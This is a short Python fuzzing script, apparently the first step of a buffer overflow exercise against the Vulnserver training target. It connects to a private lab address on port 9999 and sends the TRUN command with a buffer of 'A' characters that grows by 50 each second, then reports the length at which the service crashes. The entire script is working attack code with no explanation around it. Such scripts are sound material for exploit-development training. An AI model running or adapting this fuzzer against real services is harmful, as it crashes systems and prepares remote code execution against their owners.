#!/usr/bin/python

import sys, socket
from time import sleep 

buffer = "A" * 50 


while True:
	try: 
		payload = "TRUN /.:/" + buffer
		
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('172.16.93.132', 9999))
		print ("[+] Sending the Payload.... " + str(len(buffer)))		
		
		s.send((payload.encode()))
		s.close()
		sleep(1)
		
		buffer = buffer + "A"*50
	except:
		print ("[+] Fuzzing crashed at %s Characters...." % str(len(buffer)))
		sys.exit()
	  
